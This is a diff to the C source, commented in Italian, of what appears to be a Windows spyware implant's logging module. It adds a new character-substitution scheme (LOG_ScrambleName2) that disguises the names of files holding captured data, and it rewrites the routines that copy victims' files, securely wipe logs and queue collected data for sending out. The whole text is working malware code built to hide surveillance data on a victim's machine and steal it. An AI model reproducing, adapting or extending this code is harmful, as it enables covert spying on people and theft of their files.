@@ -415,7 +415,7 @@ BOOL LOG_InitAgentLog(DWORD agent_tag)
 	for(i=0; i<MAX_LOG_ENTRIES; i++) 
 		if (log_table[i].agent_tag == NO_TAG_ENTRY) {
 			sprintf(log_wout_path, "%.1XLOG%.4Xseq.log", log_active_queue, agent_tag);
-			if ( ! (scrambled_name = LOG_ScrambleName(log_wout_path, crypt_key[0], TRUE)) )
+			if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) )
 				return FALSE;			
 			HM_CompletePath(scrambled_name, file_name);
 			SAFE_FREE(scrambled_name);
@@ -571,6 +571,38 @@ char *LOG_ScrambleName(char *string, BYTE scramble, BOOL crypt)
 	return ret_string;
 }
 
+char *LOG_ScrambleName2(char *string, BYTE scramble, BOOL crypt)
+{
+	char alphabet[ALPHABET_LEN]={'a','_','q','T','w','B','H','W','K','F','D','M','k',		                      
+		                         'i','U','m','I','e','l','J','8','y','h','j','b','0',
+								 'f','4','z','Q','O','9','S','x','u','X','A','V','Z',
+                                 '3','7','2','E','L','r','t','G','6','v','C','N','d',
+					             's','5','p','o','Y','n','1','c','g','P','R','-'};                  
+	char *ret_string;
+	DWORD i,j;
+
+	if ( !(ret_string = _strdup(string)) )
+		return NULL;
+
+	// Evita di lasciare i nomi originali anche se il byte e' 0
+	scramble%=ALPHABET_LEN;
+	if (scramble == 0)
+		scramble = 1;
+
+	for (i=0; ret_string[i]; i++) {
+		for (j=0; j<ALPHABET_LEN; j++)
+			if (ret_string[i] == alphabet[j]) {
+				// Se crypt e' TRUE cifra, altrimenti decifra
+				if (crypt)
+					ret_string[i] = alphabet[(j+scramble)%ALPHABET_LEN];
+				else
+					ret_string[i] = alphabet[(j+ALPHABET_LEN-scramble)%ALPHABET_LEN];
+				break;
+			}
+	}
+	return ret_string;
+}
+
 // --- Funzioni per far creare file agli agenti ---
 // DEVONO ESSERE TUTTE THREAD SAFE
 
@@ -603,7 +635,7 @@ HANDLE Log_CreateFile(DWORD agent_tag, BYTE *additional_header, DWORD additional
 			return INVALID_HANDLE_VALUE;
 
 		_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "%.1XLOGF%.4X%.8X%.8X.log", log_active_queue, agent_tag, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
-		if ( ! (scrambled_name = LOG_ScrambleName(log_wout_path, crypt_key[0], TRUE)) )
+		if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) )
 			return INVALID_HANDLE_VALUE;	
 		HM_CompletePath(scrambled_name, file_name);
 		SAFE_FREE(scrambled_name);
@@ -654,7 +686,7 @@ HANDLE Log_CreateOutputFile(char *command_name)
 	FNC(GetSystemTimeAsFileTime)(&time_nanosec);	
 
 	_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "OUTF%.8X%.8X.log", time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
-	if ( ! (scrambled_name = LOG_ScrambleName(log_wout_path, crypt_key[0], TRUE)) )
+	if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) )
 		return INVALID_HANDLE_VALUE;	
 	HM_CompletePath(scrambled_name, file_name);
 	SAFE_FREE(scrambled_name);
@@ -727,7 +759,7 @@ BOOL Log_SaveAgentState(DWORD agent_tag, BYTE *conf_buf, DWORD conf_len)
 
 	// Il formato del nome e' ACFG<agent>.bin
 	_snprintf_s(conf_name, sizeof(conf_name), _TRUNCATE, "ACFG%.4X.bin", agent_tag);
-	if ( ! (scrambled_name = LOG_ScrambleName(conf_name, crypt_key[0], TRUE)) ) 
+	if ( ! (scrambled_name = LOG_ScrambleName2(conf_name, crypt_key[0], TRUE)) ) 
 		return FALSE;
 	
 	HM_CompletePath(scrambled_name, conf_path);
@@ -758,7 +790,7 @@ BOOL Log_RestoreAgentState(DWORD agent_tag, BYTE *conf_buf, DWORD conf_len)
 
 	// Il formato del nome e' ACFG<agent>.bin
 	_snprintf_s(conf_name, sizeof(conf_name), _TRUNCATE, "ACFG%.4X.bin", agent_tag);
-	if ( ! (scrambled_name = LOG_ScrambleName(conf_name, crypt_key[0], TRUE)) ) 
+	if ( ! (scrambled_name = LOG_ScrambleName2(conf_name, crypt_key[0], TRUE)) ) 
 		return FALSE;
 	
 	HM_CompletePath(scrambled_name, conf_path);
@@ -1005,7 +1037,7 @@ BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, BOOL empty_copy, DWORD a
 
 	// Vede se ha gia' catturato questo file...
 	_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "?LOGF%.4X%s*.log", agent_tag, red_fname);
-	if ( ! (scrambled_name = LOG_ScrambleName(log_wout_path, crypt_key[0], TRUE)) ) 
+	if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) ) 
 		return FALSE;	
 	HM_CompletePath(scrambled_name, dest_file_mask);
 	SAFE_FREE(scrambled_name);
@@ -1019,7 +1051,7 @@ BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, BOOL empty_copy, DWORD a
 		FNC(GetSystemTimeAsFileTime)(&time_nanosec);
 		//FNC(SystemTimeToFileTime)(&system_time, &time_nanosec);	
 		_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "%.1XLOGF%.4X%s%.8X%.8X.log", log_active_queue, agent_tag, red_fname, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
-		if ( ! (scrambled_name = LOG_ScrambleName(log_wout_path, crypt_key[0], TRUE)) ) 
+		if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) ) 
 			return FALSE;	
 		HM_CompletePath(scrambled_name, dest_file_path);
 		SAFE_FREE(scrambled_name);
@@ -1133,6 +1165,26 @@ void LOG_Purge(long long f_time, DWORD size)
 	ft.dwLowDateTime = li.LowPart;
 	ft.dwHighDateTime = li.HighPart;
 
+	scrambled_search = LOG_ScrambleName2("*.log", crypt_key[0], TRUE);
+	if (!scrambled_search)
+		return;
+
+	HM_CompletePath(scrambled_search, DirSpec);
+	SAFE_FREE(scrambled_search);
+
+	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
+	if (hFind != INVALID_HANDLE_VALUE) {
+		do {
+			if ( (size && (FindFileData.nFileSizeHigh>0 || FindFileData.nFileSizeLow>=size)) ||
+				(f_time && IsNewerDate(&ft, &FindFileData.ftCreationTime))) {
+				HM_CompletePath(FindFileData.cFileName, log_file_path);
+				HM_WipeFileA(log_file_path);
+			}
+		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
+		FNC(FindClose)(hFind);
+	}
+
+	// XXX Cerca anche il purge per i log con il vecchio scrambling...
 	scrambled_search = LOG_ScrambleName("*.log", crypt_key[0], TRUE);
 	if (!scrambled_search)
 		return;
@@ -1141,16 +1193,16 @@ void LOG_Purge(long long f_time, DWORD size)
 	SAFE_FREE(scrambled_search);
 
 	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
-	if (hFind == INVALID_HANDLE_VALUE) 
-		return;
-	do {
-		if ( (size && (FindFileData.nFileSizeHigh>0 || FindFileData.nFileSizeLow>=size)) ||
-			(f_time && IsNewerDate(&ft, &FindFileData.ftCreationTime))) {
-			HM_CompletePath(FindFileData.cFileName, log_file_path);
-			HM_WipeFileA(log_file_path);
-		}
-	} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
-	FNC(FindClose)(hFind);
+	if (hFind != INVALID_HANDLE_VALUE) {
+		do {
+			if ( (size && (FindFileData.nFileSizeHigh>0 || FindFileData.nFileSizeLow>=size)) ||
+				(f_time && IsNewerDate(&ft, &FindFileData.ftCreationTime))) {
+				HM_CompletePath(FindFileData.cFileName, log_file_path);
+				HM_WipeFileA(log_file_path);
+			}
+		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
+		FNC(FindClose)(hFind);
+	}
 }
 
 
@@ -1167,6 +1219,41 @@ void Log_SwitchQueue()
 	// La coda attiva e' sempre la 0!
 	log_active_queue = 0;
 
+	sprintf(search_mask, "%.1XLOG*.log", log_active_queue);
+	scrambled_search = LOG_ScrambleName2(search_mask, crypt_key[0], TRUE);
+	if (!scrambled_search)
+		return;
+
+	// Effettua la ricerca dei nomi dei file scramblati (* e . rimangono invariati
+	// quindi posso usare le wildcard).
+	HM_CompletePath(scrambled_search, DirSpec);
+	SAFE_FREE(scrambled_search);
+
+	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
+	if (hFind != INVALID_HANDLE_VALUE) {
+		do {
+			HM_CompletePath(FindFileData.cFileName, DirSpec); // Nome File sorgente in DirSpec
+			memcpy(DestSpec, DirSpec, sizeof(DestSpec));
+			scrambled_search = LOG_ScrambleName2("1", crypt_key[0], TRUE);
+			if (!scrambled_search)
+				break;
+
+			char *q = strrchr(DestSpec, '\\');
+			if (q) {
+				q++;
+				*q = scrambled_search[0]; // Nome File destinazione in DestSpec
+				SAFE_FREE(scrambled_search);
+			} else {
+				SAFE_FREE(scrambled_search);
+				break;
+			}
+			MoveFile(DirSpec, DestSpec);					
+
+		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
+		FNC(FindClose)(hFind);
+	}
+
+	// XXX Cerca di switchare anche i log con il vecchio scrambling
 	sprintf(search_mask, "%.1XLOG*.log", log_active_queue);
 	scrambled_search = LOG_ScrambleName(search_mask, crypt_key[0], TRUE);
 	if (!scrambled_search)
@@ -1200,7 +1287,6 @@ void Log_SwitchQueue()
 		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
 		FNC(FindClose)(hFind);
 	}
-
 }
 
 // Funzione esportata per permettere di loggare una bitmap 
@@ -1288,7 +1374,7 @@ BOOL LOG_SendOutputCmd(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 	DWORD log_count = 0;
 	UINT64 log_size = 0;
 
-	scrambled_search = LOG_ScrambleName("OUTF*.log", crypt_key[0], TRUE);
+	scrambled_search = LOG_ScrambleName2("OUTF*.log", crypt_key[0], TRUE);
 	if (!scrambled_search)
 		return FALSE;
 
@@ -1344,6 +1430,28 @@ BOOL LOG_SendLogQueue(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 
 	// Cerca tutti i file di tipo "1/0LOG*.log", sia LOG_, sia LOGF_
 	// Sono i nuovi tipi di log
+	sprintf(search_mask, "%.1XLOG*.log", !log_active_queue);
+	scrambled_search = LOG_ScrambleName2(search_mask, crypt_key[0], TRUE);
+	if (!scrambled_search)
+		return FALSE;
+	// Effettua la ricerca dei nomi dei file scramblati (* e . rimangono invariati
+	// quindi posso usare le wildcard).
+	HM_CompletePath(scrambled_search, DirSpec);
+	SAFE_FREE(scrambled_search);
+
+	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
+	if (hFind != INVALID_HANDLE_VALUE) {
+		do {
+			InsertLogList(&log_list_head, &FindFileData);
+			if (FindFileData.nFileSizeLow > 0) {
+				log_count++;
+				log_size += FindFileData.nFileSizeLow;
+			}
+		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
+		FNC(FindClose)(hFind);
+	}
+
+	// Cerca anche i log con il vecchio scrambling...
 	sprintf(search_mask, "%.1XLOG*.log", !log_active_queue);
 	scrambled_search = LOG_ScrambleName(search_mask, crypt_key[0], TRUE);
 	if (!scrambled_search)
